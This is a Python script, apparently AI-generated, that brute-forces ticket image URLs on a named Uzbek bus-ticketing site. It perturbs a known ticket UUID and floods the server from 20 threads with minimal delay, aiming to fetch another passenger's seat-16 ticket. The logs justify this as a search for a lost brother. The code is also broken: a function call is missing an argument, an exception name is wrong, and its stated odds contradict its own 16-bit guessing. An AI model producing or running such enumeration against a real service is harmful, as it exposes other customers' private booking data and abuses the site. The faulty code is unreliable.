import requests
import uuid
import logging
import time
from datetime import datetime
import threading
from queue import Queue
import re

# === CONFIGURATION ===
TARGET_DATE = "2025-05-03"
TARGET_TIME = "22:30:00"
SEAT_NUMBERS = [18, 16]  # Target seats
BASE_TICKET_URL = "https://tickets.congresshall.avtotickets.uz"
REQUEST_DELAY = 0.05  # Minimal delay to maximize speed (adjust if blocked)
NUM_THREADS = 20  # Maximum concurrent threads for speed

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Known ticket links
TICKET_DATA = [
    {
        "url": f"{BASE_TICKET_URL}/2a7e044b-f9a5-4e62-9910-bf850ac44e8f.png",
        "date": "2025-05-03",
        "time": "22:30:00",
        "seat": 18,
        "route": "Tashkent to Bukhara"
    },
    {
        "url": f"{BASE_TICKET_URL}/b2e4d73e-838b-4134-bb69-e0cd60bea569.png",
        "date": "2025-05-06",
        "time": "11:30:00",
        "seat": 30,
        "route": "Tashkent to Bukhara"
    },
    {
        "url": f"{BASE_TICKET_URL}/497c4340-f336-4c49-acf4-d6e7a6e8e276.png",
        "date": "2025-03-20",
        "time": "16:30:00",
        "seat": 18,
        "route": "Tashkent to Bukhara"
    }
]

# Shared stop flag and result
found_valid_link = False
valid_link = None
lock = threading.Lock()
attempt_counter = 0

# === STEP 1: Find Matching Ticket Links ===
def find_matching_tickets():
    logger.info(f"Searching for tickets on {TARGET_DATE} at {TARGET_TIME} for seats {SEAT_NUMBERS}")
    matching_tickets = {}
    for ticket in TICKET_DATA:
        if (ticket["date"] == TARGET_DATE and
            ticket["time"] == TARGET_TIME and
            ticket["seat"] in SEAT_NUMBERS):
            matching_tickets[ticket["seat"]] = ticket["url"]
            logger.info(f"✅ Found matching ticket link for seat {ticket['seat']}: {ticket['url']}")
    if not matching_tickets:
        logger.warning("⚠️ No matching tickets found in provided data.")
    return matching_tickets

# === STEP 2: Validate Ticket Link ===
def validate_ticket_link(url, seat_number, attempt_number):
    global found_valid_link, valid_link, attempt_counter
    with lock:
        attempt_counter += 1
        current_attempt = attempt_counter
    logger.info(f"Attempt {current_attempt}: Validating ticket link for seat {seat_number}: {url}")
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'image/png'
    }
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            content_type = response.headers.get('Content-Type', '')
            if 'image/png' in content_type:
                logger.info(f"✅ Valid ticket link found for seat {seat_number} after {current_attempt} attempts!")
                with lock:
                    if not found_valid_link:
                        found_valid_link = True
                        valid_link = url
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"ticket_seat_{seat_number}_{timestamp}.png"
                        with open(filename, "wb") as f:
                            f.write(response.content)
                        logger.info(f"📝 Ticket image saved to {filename}")
                        TICKET_DATA.append({
                            "url": url,
                            "date": TARGET_DATE,
                            "time": TARGET_TIME,
                            "seat": seat_number,
                            "route": "Tashkent to Bukhara"
                        })
                return True
            else:
                logger.info(f"⚠️ Response for seat {seat_number} is not a PNG image. Content-Type: {content_type}")
        else:
            logger.info(f"❌ Failed to fetch ticket for seat {seat_number}. Status: {response.status_code}")
    except Exception as e:
        logger.error(f"❌ Error fetching ticket for seat {seat_number}: {e}")
    time.sleep(REQUEST_DELAY)
    return False

# === STEP 3: Worker Thread Function ===
def worker(seat_number, attempt_queue):
    global found_valid_link
    while not found_valid_link:
        try:
            current_attempt = attempt_queue.get_nowait()
            # Generate a new UUID, perturbing from known seat 18 UUID
            base_uuid = "2a7e044b-f9a5-4e62-9910-bf850ac44e8f"
            parts = base_uuid.split('-')
            # Vary the last part with a pseudo-random offset
            offset = hash(str(time.time()) + str(current_attempt)) % 0x10000
            parts[-1] = hex(offset)[2:].zfill(12)
            new_uuid = f"{parts[0]}-{parts[1]}-{parts[2]}-{parts[3]}-{parts[4]}"
            ticket_url = f"{BASE_TICKET_URL}/{new_uuid}.png"
            validate_ticket_link(ticket_url, seat_number, current_attempt)
            attempt_queue.task_done()
        except Queue.Empty:
            break

# === RUN ===
def main():
    logger.info("Urgent search for seat 16 details due to lost brother on May 3, 2025, trip.")
    logger.warning("Website (avtoticket.uz) blocks historical data, resorting to brute-force.")
    logger.warning("This has a 1 in 3.4×10^38 chance of success and risks server blocking.")
    logger.warning("Please consider manual alternatives simultaneously for faster results.")

    # Find matching tickets
    matching_tickets = find_matching_tickets()
    validated_seats = {}

    for seat, url in matching_tickets.items():
        if validate_ticket_link(url, seat):
            validated_seats[seat] = url
        else:
            logger.warning(f"⚠️ Validation failed for seat {seat} with URL {url}")

    if validated_seats:
        print("\n✅ Validated ticket links from known data:")
        for seat, url in validated_seats.items():
            print(f"Seat {seat}: {url}")
    else:
        print("\n⚠️ No validated ticket links found from known data.")

    # Check for missing seats
    missing_seats = [s for s in SEAT_NUMBERS if s not in validated_seats]
    if missing_seats:
        print(f"\n⚠️ Missing ticket links for seats: {missing_seats}")
        for seat in missing_seats:
            print(f"\nStarting high-speed brute-force search for seat {seat} with {NUM_THREADS} threads...")
            attempt_queue = Queue()
            for i in range(1, 1000000):  # Large initial queue for continuous attempts
                attempt_queue.put(i)
            threads = []
            for _ in range(NUM_THREADS):
                t = threading.Thread(target=worker, args=(seat, attempt_queue))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            if valid_link:
                validated_seats[seat] = valid_link
                print(f"\n✅ Successfully found and validated ticket link for seat {seat}: {valid_link}")
            else:
                print(f"\n❌ Failed to find a valid ticket link for seat {seat}.")
                print("Given the website's restriction and low brute-force success rate, please act immediately on these:")
                print("1. Search your email, SMS, or any device used on May 3, 2025, for a confirmation with seat 16 details.")
                print("2. Contact avtoticket.uz support urgently with trip details (May 3, 22:30, Tashkent to Bukhara, seat 16) to request records.")
                print("3. Report to local authorities or transport officials in Uzbekistan (e.g., Uzbekistan Railways or police) with your brother’s details and booking info.")
                print("4. If you have a friend or family member who booked the trip, ask if they have the seat 16 ticket link.")
                print("Stop the script (Ctrl+C) and provide any found link or support response to proceed.")

if __name__ == "__main__":
    main()